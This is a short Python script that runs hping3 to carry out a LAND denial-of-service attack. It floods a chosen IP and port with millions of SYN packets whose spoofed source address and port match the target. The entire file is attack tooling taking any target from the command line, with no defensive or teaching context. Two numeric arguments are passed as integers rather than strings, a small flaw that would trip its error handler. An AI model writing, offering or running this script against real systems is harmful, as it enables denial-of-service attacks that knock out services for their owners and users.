import subprocess
import sys

def perform_land_attack(ip, port):
    command = [
        "sudo", "hping3",
        "-S",         # Set the SYN flag
        ip,           # Target IP address
        "-a", ip,     # Spoofed source IP address (same as target)
        "-k",         # Keep source port number
        "-s", str(port),  # Source port (same as target port)
        "-p", str(port),  # Target port
        "--flood",    # Flood attack mode
        "-c", 10000000,   # Number of packets to send
        "-d", 1000  # Size of each packet
    ]
    
    try:
        # Execute the command
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print("Command executed successfully:\n", result.stdout)
    except subprocess.CalledProcessError as e:
        print("An error occurred:\n", e.stderr)
    except Exception as e:
        print("A general error occurred:\n", str(e))

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 LAND_attack.py <IP_address> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])

    perform_land_attack(ip, port)

if __name__ == "__main__":
    main()
